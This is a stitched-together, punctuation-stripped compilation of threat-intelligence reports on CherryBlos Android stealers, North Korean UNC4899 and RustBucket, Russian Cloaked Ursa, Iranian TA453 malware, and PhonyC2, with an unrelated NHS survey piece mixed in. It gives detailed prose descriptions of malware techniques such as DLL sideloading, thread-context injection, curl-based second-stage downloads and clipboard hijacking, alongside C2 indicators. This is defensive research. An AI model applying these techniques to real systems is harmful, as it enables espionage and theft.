        "text": "Two new Android malware families named 'CherryBlos' and 'FakeTrade' were discovered on Google Play aiming to steal cryptocurrency credentials and funds or conduct scamsThe malicious apps use various distribution channels including social media phishing sites and deceitful shopping apps on Google Play Android's official app storeCherryBlos malware was seen distributed for the first time in April 2023 in the form of an APK Android package file promoted on Telegram Twitter and YouTube under the guise of AI tools or coin minersThe names used for the malicious APKs are GPTalk Happy Miner Robot999 and SynthNet downloaded from the following websites with matching domain namesA malicious Synthnet app was also uploaded onto the Google Play store where it was downloaded roughly a thousand times before being reported and removedCherryBlos is a cryptocurrency stealer that abuses Accessibility service permissions to fetch two configuration files from the C2 server automatically approve additional permissions and prevent the user from killing the trojanized appCherryBlos uses a range of tactics to steal cryptocurrency credentials and assets with the main tactic being to load fake user interfaces that mimic official apps to phish for credentialsHowever a more interesting feature can be enabled which uses OCR optical character recognition to extract text from images and photos stored on the deviceFor example when setting up new cryptocurrency wallets users are given a recovery phrasepassword consisting of 12 or more words that can be used to recover the wallet on the computerAfter showing these words users are prompted to write them down and store them in a safe place as anyone with this phrase can use it to add your crypto wallet to a device and access the funds within itHowever if this malware feature is enabled it could potentially OCR the image and extract the recovery phrase allowing them to steal the walletThe collected data is then sent back to the threat actors' servers at regular intervals as shown belowThe malware also acts as a clipboard hijacker for the Binance app by automatically switching a crypto recipient's address with one under the attacker's control while the original address appears unchanged to the userThis behavior allows the threat actors to redirect payments sent to users to their own wallets effectively stealing the transferred fundsThese apps use shopping themes or money-making lures that trick users into watching ads agreeing to premium subscriptions or topping up their in-app wallets and never allowing them to cash out the virtual rewardsThe apps use a similar interface and generally target users in Malaysia Vietnam Indonesia Philippines Uganda and Mexico while most of them were uploaded onto Google Play between 2021 and 2022Google told BleepingComputer that the reported malware apps had been removed from Google PlayWe take security and privacy claims against apps seriously and if we find that an app has violated our policies we take appropriate action Google told BleepingComputerHowever as thousands of users have already downloaded them manual clean-ups might be required on infected devices"

compromise ultimately began as a result of a sophisticated spear phishing campaign aimed at JumpCloud a zero-trust directory platform service used for identity and access management JumpCloud reported this unauthorized access impacted fewer than five customers and less than 10 devicesThe details in this blog post are based on Mandiants investigation into the attack against one of JumpClouds

the threat actor target four 4 OSX Ventura systems running either versions 133 or 1341 During the forensic analysis of these systems Mandiant identified a relatively new forensic artifact that proved extremely valuable to the investigationThis forensic artifact is related to Apples XProtect services specifically the XProtect Behavioral Service There are currently five behavioral-based rules defined by Apple Information about executed programs that violate one or more of these rules is recorded in the XProtect Database XPdb which is stored in SQLite 3 format and located at varprotectedxprotectXPdb At this time it does not appear that the XProtect Behavioral Service is configured to block executionThrough analysis of data stored in the XPdb Mandiant identified entries containing specific signing identifiers that correlated to attacker payloads Specifically the execsigningid field within the XPdb contains information about the signature of the binary which can be used to help identify the author of a particular signed binary Mandiant identified three unique signatures associated with malicious filesMandiant used these signatures to search the XPdb for additional attacker payloads that were deleted by the threat actor or otherwise unable to be identified through other forms of analysisAn additional field of interest in the XPdb was the execcdhash which contains the cdhash or Code Directory hash of the executed binaries Mandiant identified the historical execution of malicious binaries across multiple systems using cdhash values stored in the XPdb Because the cdhash is computed based on executable code in the application Mandiant was able to identify additional malware in the environment despite the files being deleted by the threat actor and the samples having different file hashesFurther fields of interest in the XPdb had the prefix responsible and contained information about the parent of the process which violated the behavioral rules On multiple systems XPdb entries for the malware contained the parent process of the JumpCloud agent further evidence that the threat actor leveraged JumpCloud to gain initial access to victim environmentsThe threat actor was consistently observed removing prior payloads from disk however the FSEvents artifacts were able to provide great insight into files that previously existed on disk The FSEvents contained details on the creation modification permission changes renaming and removal of files even if the filesystem no longer contained artifacts indicating the existence of these files remained Using the nodeid field associated with individual entries Mandiant was able to identify the order of specific threat actor activities on systems and the updated names of renamed filesThe following table provides an example of the relevant data obtained from FSEventsnodeidfullpathDescription53789510LibraryRubyGems260extensionsinitrbRuby

at least one instance the malicious code was a lightweight Ruby script that was executed via the JumpCloud agent The script contained instructions to download and execute a second stage payload Within 24 hours of gaining initial access to systems in the victim environment the threat actor deployed additional backdoors and established persistence via plists The initial payloads and second stage backdoors were removed from the systemThe directory choices and naming conventions of the Ruby script and second stage payloads indicated the threat actor placed significant priority into masquerading

a first-stage backdoor before deploying STRATOFEAR as a second-stage backdoorSTRATOFEAR is a modular backdoor that communicates with C2 servers using a protocol specified in its C2 configuration which is decrypted from a local file The backdoors primary functionality involves retrieving and executing additional modules Modules may be downloaded from a remote server or loaded from diskSTRATOFEAR

reconnaissance data associated with executives and internal security teamsUNC4899 targeting overlaps with a separate RGB-aligned group APT43 who in July 2023 displayed interest in the cryptocurrency vertical specifically targeting a variety of C-Suite executives from multiple fintech and cryptocurrency companies in the United States South Korea Hong Kong and Singapore Many of the individuals work at organizations related to financial services cryptocurrency blockchain web3 and related entities The overlaps in targeting and sharing of infrastructure amongst DPRK groups highlights the continued targeting and coordinated interest in the cryptocurrency fieldMandiant has observed RGB units utilize a series of Operational Relay Boxes ORBs using L2TP IPsec tunnels along with commercial VPN providers to obscure their source address These relays seem to be heavily shared among units under the RGB umbrellaMandiant observed UNC4899 utilize various VPN providers as a final hop the most common being ExpressVPN but connections to NordVPN TorGuard and many other providers have also been observed There have been many occasions in which DPRK threat actors did not employ this last hop or mistakenly did not utilize this while conducting actions on operations on the victim's networkThe VPNs used by RGB actors occasionally fail which reveals the IP addresses of the actor's true origins Mandiant observed the DPRK threat actor UNC4899 connecting directly to an attacker-controlled ORB from their 17545178024 subnet Ryugyong Dong Pyongyang Additionally we observed the DPRK threat actor log directly into a Pyongyang IP from one of their jump boxes Our evidence supports that this was an OPSEC slip up since the connection to the North Korean netblock was short-lived Figure 2 provides an overview of the network infrastructure used in this campaignAdditionally Mandiant was able to uncover additional infrastructure due to the fact that a PTR record was never changed from a previous operation Mandiant has previously identified the domain wasxxvsite being used by North Korean threat actors Additionally the IP address 198244135250 is being utilized for another C2 domain prontoposercom while still having a PTR record to the domain previously identifiedMandiant is tracking this activity as UNC4899 a suspected North Korean actor We assess with high confidence that UNC4899 is a cryptocurrency-focused group that falls under the RGB UNC4899's targeting is selective and they have been observed gaining access to victim networks through JumpCloud Mandiant has observed overlap amongst multiple North Korean groups that fall under the RGB These groups commonly share infrastructure to complete their actions on objectives Mandiant has observed UNC2970 APT43 and UNC4899 all utilize similar infrastructureMandiant has observed an increase in financially motivated operations by DPRK actors in the past year particularly those focused on the cryptocurrency industry RGB-aligned crypto-focused groups publicly reported under the umbrella term Lazarus and clear variants of historic established APT threat actors such as the open source TraderTraitor and AppleJeus have increasingly conducted financially motivated operations that have affected the cryptocurrency industry and various blockchain platformsMandiant assesses that DPRKs cyber landscape has evolved to a streamlined alignment with shared tooling and targeting efforts Operators within these units quickly change their current focus and begin working on separate unrelated efforts such as ransomware weapons and nuclear targeting cryptocurrency efforts etc This seeming streamlining of activities by DPRK often makes it difficult for defenders to track attribute and thwart malicious activities while enabling this now collaborative adversary to move stealthily and with greater speed The level of shared targeting and tooling leads Mandiant to believe that shifts are continuing to occur even outside of the heavily RGB dominated cyber landscapeBeyond the listed authors are many Mandiant professionals whom we would like to thank for their continued effort and dedication in working with our clients to respond to DPRK related intrusions We also want to specifically thank Googles Threat Analysis Group TAG Mandiants DPRK Fusion Cell and our government partners for their

        "title": "Diplomats Beware Cloaked Ursa Phishing With a Twist",
        "text": "July 12 2023 at 300 AMRussias Foreign Intelligence Service hackers which we call Cloaked Ursa aka APT29 UAC-0004 Midnight BlizzardNobelium Cozy Bear are well known for targeting diplomatic missions globally Their initial access attempts over the past two years have predominantly used phishing lures with a theme of diplomatic operations such as the followingThese types of lures are generally sent to individuals who handle this type of embassy correspondence as part of their daily jobs They are meant to entice targets to open the files on behalf of the organization they work forRecently Unit 42 researchers observed instances of Cloaked Ursa using lures focusing on the diplomats themselves more than the countries they represent We have identified Cloaked Ursa targeting diplomatic missions within Ukraine by leveraging something that all recently placed diplomats need a vehicleOur assessment that Cloaked Ursa is responsible for these lures is based on the followingThese unconventional lures are designed to entice the recipient to open an attachment based on their own needs and wants instead of as part of their routine dutiesThe lures themselves are broadly applicable across the diplomatic community and thus are able to be sent and forwarded to a greater number of targets Theyre also more likely to be forwarded to others inside of an organization as well as within the diplomatic communityOverall these factors increase the odds of a successful compromise within targeted organizations While not likely to fully supplant diplomatic operations-themed lures these lures focusing on individuals do provide Cloaked Ursa with new opportunities and a broader range of susceptible potential espionage targetsPalo Alto Networks customers receive protections against the types of threats discussed in this article by products includingOne of the most recent of these novel campaigns that Unit 42 researchers observed appeared to use the legitimate sale of a BMW to target diplomats in Kyiv Ukraine as its jumping off pointThe campaign began with an innocuous and legitimate event In mid-April 2023 a diplomat within the Polish Ministry of Foreign Affairs emailed his legitimate flyer to various embassies advertising the sale of a used BMW 5-series sedan located in Kyiv The file was titled BMW 5 for sale in Kyiv - 2023docxThe nature of service for professional diplomats is often one that involves a rotating lifestyle of short- to mid-term assignments at postings around the world Ukraine presents newly assigned diplomats with unique challenges being in an area of armed conflict between Russia and UkraineHow do you ship personal goods procure safe accommodations and services and arrange for reliable personal transportation while in a new country The sale of a reliable car from a trusted diplomat could be a boon for a recent arrival which Cloaked Ursa viewed as an opportunityWe assess that Cloaked Ursa likely first collected and observed this legitimate advertising flyer via one of the emails recipients mail servers being compromised or by some other intelligence operation Upon seeing its value as a generic yet broadly appealing phishing lure they repurposed itTwo weeks later on May 4 2023 Cloaked Ursa emailed their illegitimate version of this flyer to multiple diplomatic missions throughout Kyiv These illegitimate flyers shown in Figure 1 use benign Microsoft Word documents of the same name as that sent by the Polish diplomatThe key difference with these illegitimate versions is that if a victim clicks on a link offering more high quality photos a URL shortener service either tly or tinyurlcom will redirect them to a legitimate site This site would have been coopted by Cloaked Ursa resulting in the download of a malicious payloadWhen a victim attempts to view any of the high quality photos shown in Figure 2 in the download the malware executes silently in the background while the selected image displays on the victims screenFigure 3 illustrates the full execution flowThese pictures are actually Windows shortcut files masquerading as PNG image filesWeve observed two versions of these illegitimate flyers The only difference between the two is the shortened URL used in each case The URLs ultimately redirect the victim to the same coopted site hxxpsresetlocationscombmwhtmOverall we observed Cloaked Ursa targeting at least 22 of over 80 foreign missions located in Kyiv in this campaign as shown in Table 1 The actual number targeted is likely higher This is staggering in scope for what generally are narrowly scoped and clandestine APT operationsKnown Embassies in Kyiv Targeted by Cloaked Ursa in BMW CampaignFor the activity we observed Cloaked Ursa used publicly available embassy email addresses for approximately 80 of the targeted victims The remaining 20 consisted of unpublished email addresses not found on the surface webThis indicates that attackers likely also used other collected intelligence to generate their victim target list to ensure they were able to maximize their access to desired networks The majority of the targeted organizations in this campaign were embassies However we also observed Cloaked Ursa targeting both Turkish Ministry of Trade representatives in Ukraine via their ticaretgovtr work emails and their embassy in the BMW campaignWhile there were a handful of emails sent directly to individuals work addresses within the campaign the majority of the targeted emails consisted of general inboxes for the embassy such as countryembassymfagovxx Despite the thought and detail put into targets for this campaign at least two of the email addresses contained errors and never reached the intended targets Overall the use of these group inboxes likely increased the odds of the emails being reviewed and passed on to individuals within the embassies looking for transportationWith a few of the embassies we observed being targeted this was done via group emails hosted on free online webmail services While these services offer some protection they also outsource a portion of the security provided to targeted organizations and their employees to external entities The use of free online webmail could have the unintended consequence of increasing a diplomatic organizations difficulty in observing and understanding the totality of threats targeting it while also increasing its attack surfaceNot one to let a disaster and the highly sympathetic charge it generates go to waste Cloaked Ursa likely saw a lure providing MFA guidance on humanitarian support for this tragedy as a way to ensure a high level of interest from their targets these recipients would feel a patriotic obligation and would understand the MFAs expectations to support their nation and its victims In addition given the timely and momentous nature of the lure it was almost certainly forwarded by concerned employees to others in their organization who would be interested in the guidanceDiplomatic missions will always be a high-value espionage target Sixteen months into the Russian invasion of Ukraine intelligence surrounding Ukraine and allied diplomatic efforts are almost certainly a high priority for the Russian governmentAs the above campaigns show diplomats should appreciate that APTs continually modify their approaches including through spear phishing to enhance their effectiveness They will seize every opportunity to entice victims into compromise Ukraine and its allies need to remain extra vigilant to the threat of cyber espionage to ensure the security and confidentiality of their informationRecommendationsPalo Alto Networks customers receive protections against the types of threats

name is changed depending on the LNK file clickedWhile windocexe is not malicious it does attempt to load several DLLs on runtime and falls victim to DLL hijacking As a result it will load two of the three DLLs within its current directory namely APPVISVSUBSYSTEMS64dll SHA256 38f8b8036ed2a0b5abb8fbf264ee6fd2b82dcd917f60d9f1d8f18d07c26b1534 and MSVCP140dll SHA256 706112ab72c5d770d89736012d48a78e1f7c643977874396c30908fa36f2fed7 The third DLL Mso20Win32Clientdll does not appear to be essential to the malwares functioning and is added so that windocexe runs correctly similarly to the DLL described belowMSVCP140 is not digitally signed but does not contain any malicious functionality It appears to only contain a select few exports from a legitimate copy of MSVCP140 Its likely that this was included to execute windocexe on systems that did not have Microsoft Visual C Redistributables at least enough so that it would load APPVISVSUBSYSTEMS64APPVISVSUBSYSTEMS64 on the other hand is a fairly obfuscated DLL It leverages a large number of unnecessary assembly instructions including the following likely hindering decompilation efforts and slowing down analysisAPPVISVSUBSYSTEMS64 contains a number of anti-analysis techniques including the followingIf these checks are all passed the sample will proceed to open the encrypted payload file found within the ISO file in this case named ojg2px SHA256 c62199ef9c2736d15255f5deaa663158a7bb3615ba9262eb67e3f4adada14111 Once read into memory it will decrypt the file using an XOR operation which results in a secondary shellcode layerFirst the shellcode is mapped and copied into the remote process using NtMapViewOfSection before a new remote thread is created in a suspended state using NtCreateThreadEx The interesting aspect of this injection technique is that instead of the created thread pointing to the shellcode entry point or any Windows API it is given a start address of a function within the APPVISVSUBSYSTEMS64 process Its possible that the authors did this to evade monitoring tools from identifying a newly created thread pointing to malicious shellcodeBefore the thread is resumed with NtResumeThread APPVISVSUBSYSTEMS64 will use NtGetContextThread and NtSetContextThread to modify the RCX register which will contain the thread entry to point to the entry point of the shellcodeThis results in the resumed thread calling RtlUserThreadStart which will move the value in the RCX register to R9 before calling it thus triggering the shellcodeThe goal of the shellcode is to extract the final executable file payload in memory and transfer execution to it This payload is the final sample in the infection chain and is responsible for handling communication to and from the command and control C2 serverFor communication the payload uses both the Microsoft Graph and Dropbox API Cloaked Ursa has previously leveraged Dropbox as a C2 server However Cloaked Ursas use of Microsoft Graph API to facilitate C2 communications appears to be a relatively new addition to their toolkitIn addition to the string encrypted tokens and API keys required to communicate with these platforms there is another string that stands out shown in Figure 6 used when communicating with the Microsoft Graph API TeamstestGiven that the Graph API allows for interacting with a number of different Microsoft 365 Services including Microsoft Teams its possible that this was an initial test for communicating via Teams or the Graph APIIf communication fails via the Graph API several times communication via Dropbox is attempted Several decrypted strings in the binary provide insight into the use of Dropbox for communicationIn this sample it appears that they have opted to use BMP files The threat actor-owned C2 will upload commands to Dropbox that are wrapped in the BMP format These commands are retrieved by the payload and then parsed decrypted and executed Any data that the payload uploads to Dropbox will also be encrypted and wrapped in the BMP formatIn terms of handled commands the payload accepts five possible requests from the C2 server as described in the table belowBased on the lack of additional commands its likely this is merely a loader for a further sample As of mid-June the Dropbox and Graph API credentials are no longer valid preventing access to any information that was uploaded to either platformWe identified an additional sample with similar characteristics to other attributed Cloaked Ursa campaigns which we believe to have been targeting the Turkish Ministry of Foreign Affairs We did not observe the lure or lures used in this campaign but we are able to identify the attack chain after the original lure We assess that the original lure enticed the target to click on hxxps simplesalsamixcome-yazihtml The URL is no longer active but it originally retrieved an HTTP smuggling file named e-yazihtml SHA256 cd4956e4c1a3f7c8c008c4658bb9eba7169aa874c55c12fc748b0ccfe0f4a59aThe downloaded file is assigned the name e-yazizip SHA256 0dd55a234be8e3e07b0eb19f47abe594295889564ce6a9f6e8cc4d3997018839 This sample contains five filesOnce again a legitimate WinWordexe binary was found within the archive named e-yazidocxexe However whitespace was added between the docx and exe resulting in the file appearing as a document fileAlongside the WinWordexe a file named APPVISVSUBSYSTEMS64dll SHA25660d96d8d3a09f822ded0a3c84194a5d88ed62a979cbb6378545b45b04353bb37 was present once again as well as a file named okxi4tzSHA256 03959c22265d0b85f6c94ee15ad878bb4f2956a2b0047733edbd8fdc86defc48 This file is similar to the previously mentioned ojg2px in that it contains encrypted shellcodeOn execution of WinWordexe APPVISVSUBSYSTEMS64dll is sideloaded and assuming the standard anti-analysis checks were passed it would open and read the data from okxi4tz before decrypting it and injecting it into the first running process it canThe injected shellcode shares a number of similarities with code seen in the BMW-related sample such as the followingThe final payload within this infection chain is somewhat similar to the BMW-linked final payload in that it leverages both Microsoft Graph API and the Dropbox API for C2 communication Instead of Teamstest being the project name its set to mytestworkapp1 The hard-coded API tokens are also different from the initially analyzed sampleSimilar obfuscation was employed within this sample including string encryption and control flow obfuscation via abusing the exception handling structures However there are no junk functions added to the sample resulting in a much smaller file size of 498 KBUpdated July 20 2023 at 1243 pm PT to change UAC-0029 to

lure masquerading as a senior fellow with the Royal United Services Institute RUSI to the public media contact for a nuclear security expert at a US-based think tank focused on foreign affairs The email solicited feedback on a project called Iran in the Global Security Context and requested permission to send a draft for review The initial email also mentioned participation from other well-known nuclear security experts TA453 has previously masqueraded as in addition to offering an honorarium TA453 eventually used a variety of cloud hosting providers to deliver a novel infection chain that deploys the newly identified PowerShell backdoor GorjolEcho When given the opportunity TA453 ported its malware and attempted to launch an Apple flavored infection chain dubbed NokNok by Proofpoint TA453 also employed multi-persona impersonation in its unending espionage questContinuing With Benign Message ApproachTA453 continues to iterate and use benign messages to target experts in Middle Eastern affairs and nuclear security As Joint Comprehensive Plan of Action JCPOA negotiations continue and Tehran finds itself increasingly isolated within its sphere of influence TA453 is focusing a large majority of its targeting efforts against the experts likely informing these foreign policies As seen in one of TA453s most recent campaigns Figures 1 and 2 the threat actor initiated contact with its target using a benign email and later used multi-persona impersonation listing additional experts to establish rapport with the target Figure 1 Initial TA453 approach using a benign emailFigure 2 TA453 multi-persona impersonation approach in a follow-on emailAt this time Proofpoint judges that all of these accounts are actor-created to spoof well-known experts and are not compromised accountsAfter just one benign email interaction with the intended target TA453 delivered a malicious link to a Google Script macro that would redirect the target to a Dropbox URL The URL hosted a password encrypted rar file Abraham Accords MENArar SHA256 ddead6e794b72af26d23065c463838c385a8fdff9fb1b8940cd2c23c3569e43b which contained a dropper titled Abraham Accords MENApdflnk

injection The LNK enclosed in the RAR used PowerShell to download additional stages from a cloud hosting providerFigure 3 GorjolEcho full infection chainWhen Dropbox was notified they rapidly disrupted the accounts associated with this TA453 campaignFollowing the dropper using obfuscated PowerShell to call out to the cloud hosting provider the malware uses the Gorjol function to download base64 encoded content from a txt file The downloaded content is decoded and invoked becoming the function Borjol Figure 4Figure 4 Borjol functionBorjol communicates over AES encrypted HTTPS with the attacker-registered subdomain fuschia-rhinestonecleverappsio via the legitimate Clever Cloud service which allows users to host JavaScript applications in the cloud The returned data decrypts into another Borjol function This new function uses previous variables and results in decrypting the PowerShell backdoor dubbed GorjolEcho by Proofpoint GorjolEcho establishes persistence through putting a copy of the initial stages in a StartUp entry The backdoor is now staged and ready to executeGO GO GORJOL GorjolEcho starts by displaying a decoy PDF that matches the content of the initial phishing approach before encoding encrypting and exfiltrating information to the C2 If the C2 responds with any HTTP response besides 400 or 200 an error message in Korean of wau ije ulineun mueos-eul halkkayo is provided The message roughly translates to wow now what are we doingFigure 5 GorjolEchoFollowing TA453s attempted delivery of GorjolEcho TA453 realized the delivered file would not run on the targets Apple computer About a week later the TA453 persona reached out again via email with a new infection chain ported to work on Mac operating systems Figure 6 TA453 email with a Mac infection chainThe message contained a password-protected ZIP file containing the first stage Mac malware along with a series of instructionsMach-O Within the ZIP archive file was a bespoke Mac application masquerading as a RUSI VPN solution and share drive GUI Upon initialization it executes an Apple script file which uses curl to download a file from library-storecamdvrorgDMPRalphanumeric string At the time of analysis library-storecamdvrorg was resolving to 144217129176 an OVH IP This second stage is a bash script dubbed NokNok that establishes a backdoor on the system It generates a system identifier by combining the operating system name hostname and a random number That system identifier is then encrypted with the NokNok function and base64 encoded before being used as the payload of an HTTP POST to library-storecamdvrorg The script first establishes persistence by looping indefinitely and posts every two seconds It expects responses containing either KillKill or ModuleName If it receives the former it terminates the script If it receives the latter it executes the content of the response as a commandProofpoint judges NokNok is almost certainly a port or evolution of the aforementioned GorjolEcho and is intended to serve as an initial foothold for TA453 intrusionsFigure 7 NokNok deliveryNokNok Modules During our analysis Proofpoint identified four very similar but unique modules called the following by TA453Figure 8 NokNok module analysisThese NokNok modules are bash scripts all of which share an encryption and base64 chunking routine for exfiltration The modules define SendDataByHttp function which collects username and system name before encrypting the information with NokNok encryption base64 encoding it and chunking it for transportation Logs are also sent to the TA453-controlled C2 server Two of the modules Processes and Persistence were delivered twice during our analysisThe Processes module uses ps-aux to gather a list of all currently running processesFigure 9 NokNok Processes moduleThe Informations module uses the systemprofiler tool on macOS to retrieve information about the system's software specifically the SPSoftwareDataType which includes details such as the operating system version system uptime and installed software The module also uses ifconfig to gather network information All of this information is encoded in base64 and then saved to resulttxt for exfiltrationFigure 10 NokNok Informations moduleThe Applications module conducts similar reconnaissance using echo to list installed Applications which are then base64 encoded for exfiltrationFinally the Persistence module establishes persistence by first removing LaunchAgents then recreating the same directory writing a hardcoded key to Idtxt and then using curl to download replacements to Finder and Finder's Property List While the file was unavailable to Proofpoint at the time of our analysis it is almost certain that the TA453-controlled server is either delivering another remote access trojan or an additional stage for further operator exploitationFigure 11 NokNok Persistence moduleFake File Sharing Website The emailed instructions accompanying the malicious attachment included a link and credentials to a fake file sharing service spoofing a RUSI Wing FTP server hosted on the dynamic DNS hostname filemanagertheworkpccomFigure 12 Lure website filemanagertheworkpccomThe site appears to reject the provided username and password and is likely just there to establish legitimacy for the attached malware There is the possibility that the website could be tracking and fingerprinting visitors but no abnormal code was identified in Proofpoints review When questioned by the target TA453 claimed the provided password was correct and the target simply needed to run the application to appropriately access the filesFigure 13 Error message from TA453 lure websiteDespite the identified infection chains differing from past TA453 intrusions where malware was deployed via VBA macro GhostEcho also known as CharmPower or remote template injection Korg Proofpoint attributes this campaign and this malware to TA453 with high confidence This assessment is based on both direct code similarities and similarities in overall campaign tactics techniques and procedures Proofpoint assesses GorjolEcho and NokNok represent the latest iterations of TA453s backdoor This modular backdoor was first detected by Proofpoint in Fall 2021Proofpoint currently views TA453 as overlapping with Microsofts Mint Sandstorm formerly PHOSPHORUS and roughly equivalent to Mandiants APT42 and PWCs Yellow Garuda all of which can generally be considered Charming KittenTA453 continues to significantly adapt its infection chains to complicate detection efforts and conduct cyber espionage operations against its targets of interest The use of Google Scripts Dropbox and CleverApps demonstrate that TA453 continues to subscribe to a multi-cloud approach in its efforts to likely minimize disruptions from threat hunters TA453s willingness to port malware to Mach-O also demonstrates how much effort the threat actor is willing to put

        "text": "RustBucket is noteworthy for the range and type of anti-evasion and anti-analysis measures seen in various stages of the malware In this post we review the multiple malware payloads used in the campaign and highlight the novel techniques RustBucket deploys to evade analysis and detectionThe Stage 1 is easily the least sophisticated and easily detected part of the attack chain The arguments of the do shell script commands should appear in the Macs unified logs and as output from command line tools such as the ps utilitySuccess of the Stage 1 relies heavily on how well the threat actor employs social engineering tactics In the case described by JAMF the threat actors used an elaborate ruse of requiring an internal PDF reader to read a supposedly confidential or protected document Victims were required to execute the Stage 1 believing it to be capable of reading the PDF they had received In fact the Stage 1 was only a dropper designed to protect the Stage 2 should anyone without the malicious PDF stumble on itWe have found a number of different Stage 2 payloads some written in Swift some in Objective-C and both compiled for Intel and Apple silicon architectures see IoCs at the end of the post The sizes and code artifacts of the Stage 2 samples vary The universal fat binaries vary between 160Kb and 210KbAcross the samples various username strings can be found Those we have observed in Stage 2 binaries so far includeDespite the differences in size and code artifacts the Stage 2 payloads have in common the task of retrieving the Stage 3 from the command and control server The Stage 2 payload requires a specially-crafted PDF to unlock the code which would lead to the downloading of the Stage 3 and provide an XORd key to decode the obfuscated C2 appended to the end of the PDFIn some variants this data is executed in the downAndExecute function as described by previous researchers in others we note that download of the next stage is performed in the aptly-named downupdaterun function This function itself varies across samples In b02922869e86ad06ff6380e8ec0be8db38f5002b for example it runs a hardcoded command via systemHowever the same function in other samples eg d5971e8a3e8577dbb6f5a9aad248c842a33e7a26 use NSURL APIs and entirely different logicResearchers at Elastic noted further that in one newer variant of Stage 2 written in Swift the User-Agent string is all lowercase whereas in the earlier Objective-C samples they are notAlthough User-Agent strings are not inherently case sensitive if this was a deliberate change it is possible the threat actors are parsing the User-Agent strings on the server side to weed out unwanted calls to the C2 That said sloppiness around case-sensitivity is seen elsewhere in RustBucket samples eg usersshared in Stage 1 and the case variance may be no more than a product of different developers with different standards of rigor In the most recent samples the payload retrieved by Stage 2 is written to disk asErrorCheckzip in CSDARWINUSERTEMP aka TMPDIR typically at varfoldersT before being executed on the victims deviceThe Stage 3 payload has so far been seen in two distinct variantsHowever variant B has not scrubbed all webT artifacts from the code and reference to the missing module can still be found in the stringsThe substring Trojan which does not appear in earlier variants is also found in the file path referenced by the same stringImportantly variant B contains a persistence mechanism that was not present in the earlier versions of RustBucket This takes the form of a hardcoded LaunchAgent which is written to disk at LibraryLaunchAgentscomapplesystemupdateplist The ErrorCheck file also writes a copy of itself to LibraryMetadataSystem Updateand serves as the target executable of the LaunchAgentSince the Stage 3 requires a URL as a launch parameter this is provided in the property list as a Program Argument Curiously the URL passed to ErrorCheck on launch is appended to this hardcoded URL in the LaunchAgent plistAppending the supplied url value to the hardcoded URL can be clearly seen in the code though whether this is an error or accounted for in the way the string is parsed by the binary we have yet to determineAfter gathering environmental information the malware calls symupdatorsendrequest to post the data to the C2 using the following User-Agent string this time not in lowercaseThe malware compares the response against two hardcoded values 0x31 and 0x30In the sample analyzed by Elastic the researchers reported that 0x31 causes the malware to self-terminate while 0x30 allows the operator to drop a further payload in theCSDARWINUSERTEMP directoryThe choice of Rust and the complexity of the Stage 3 binaries suggest the threat actor was willing to invest considerable effort to thwart analysis of the payload As the known C2s were unresponsive by the time we conducted our analysis we were unable to obtain a sample of the next stage of the malware but already at this point in the operation the malware has gathered a great deal of host information enabled persistence and opened up a backdoor for further malicious activitySentinelOne Singularity protects customers from known components of the RustBucket malware Attempts to install persistence mechanisms on macOS devices are also dynamically detected and blocked by the agentThe RustBucket campaign highlights that the threat actor whom previous researchers have confidently attributed to DPRKs BlueNoroff APT has invested considerable resources in multi-stage malware aimed specifically at macOS users and is evolving its attempts to thwart analysis by security researchersThe extensive effort made to evade analysis and detection in itself shows the threat actor is aware of the growing adoption of security software by organizations with macOS devices in their fleets as security teams have increasingly begun to see the need for better protection than

        "text": "Deputy Editor Infosecurity MagazineOver half 56 of UK citizens do not trust the NHS to use AI to analyze patient data due to security and privacy concerns according to research by VMwareIn addition a quarter 25 of the more than 2000 respondents to the VMware survey said they are completely against the NHS using AI to process their patient dataDr Will Venters Associate Professor of Information Systems London School of Economics told Infosecurity that the findings show that social as well as technical and legal barriers to the use of AI in the NHS must be overcome before the healthcare benefits of these technologies can be fully realizedWe need patients to accept its use Back in 2016 there was considerable controversy from Googles DeepMind relationship and the Royal Free London NHS Trusts sharing of data from 16 million patients Avoiding such controversy and political backlash should be part of the overall security and privacy strategy for sustainable AI he explainedGuy Bartram Cloud Evangelist EMEA VMware added that education and transparency around how AI is used and its benefits should be a priorityPeople need educating in what new technologies like AI will be doing with their data and the NHS could go far by openly discussing and advertising their solutions and how they ensure national citizen data security is maintained not doing so leaves room for doubt and will not gain trust he commentedDespite the concerns 45 of the respondents to the VMware research said they were open to the NHS using AI to improve services and 44 were happy with these technologies to be used in processing patient data if it helped to process diagnostic tests fasterThe study also found that 87 of UK consumers believe it is important their NHS patient data is stored in the UK Of these respondents 39 think that this data being held within the countrys national borders will ensure it complies with UK data privacy regulationsOver a fifth 22 said they do not trust other countries to safeguard their data as well as the UK does while 21 believe this information will be less likely to be exposed to foreign cyber threats or accessed by foreign entitiesIn the report VMware highlighted that many UK NHS and social care providers use public cloud services which means that patient data is currently hosted either within the UK the European Economic Area EEA or a country deemed adequate by the UKOverall the majority 59 of consumers expressed confidence in the NHSs ability to safeguard their sensitive informationVenters expressed surprise at the strength of opposition to NHS data leaving the UK but acknowledged that the strength of feeling around UK sovereignty should be reflected in the institutions data practicesHe said As Nigel Lawson once said the National Health Service is the closest thing the English have to a religion people tend to trust it Maintaining that trust over the decades to come requires robust and patient centric approaches to data management and securityBartram commented that the findings show the importance of the NHS and other critical sectors demonstrating data sovereignty to build consumer trust with patient data He said this can be achieved by ensuring more data is stored in a sovereign cloud which ensures all data including metadata is held within the local jurisdictionThe NHS and any other verticalized industry needs to make careful choices about where their data is resident under whose jurisdiction how and particularly what is processed Processing or storing any data that is confidential or has privacy legislation regarding the data and meta data should be subject only to the jurisdictional laws of which its owner pertains he told InfosecurityThe research was published on July 5 2023 the 75th anniversary of the UKs National Health Service NHS"

PhonyC2 MuddyWater uses social engineering as its primary initial access point so they can infect fully patched systems Organizations should continue to harden systems and monitor for PowerShell activityIn April 2023 Deep Instincts threat research team identified three malicious PowerShell scripts that were part of an archive called PhonyC2v6zipNote V6 is the name of the folder found on the server Since this is not an official C2 framework there is no changelog and version history The framework has been changed over time but we don't know the internal version numbers Therefore we refer to other versions by unique identifiers rather than version numbersNote Sicehice is an organization that automates the collection of cyber threat intelligence from over 30 sources and enables users to search against the collected IPsThere was no previous information regarding PhonyC2 and as the zip file contained the source code we decided to analyze the code to further understand this C2 frameworkFurther research revealed additional connections to MuddyWater infrastructure including the ongoing PaperCut exploitation and previous attacks using earlier versions of the C2 frameworkIn figure 2 commands related to PhonyC2 are marked in redThe combination of the presence of known MuddyWater tools on the server and the fact that the threat actor communicated with two IP addresses known to be used by MuddyWater raised suspicion that PhonyC2 is a framework used by MuddyWaterTo better understand the Phony C2 framework we looked at the source code As we can see in figure 2 above the first file of interest is PleaseRunOncepyThe script creates a unique config file where the IP address the port that the C2 framework listens to for connections and an extension for a decoy must be specified 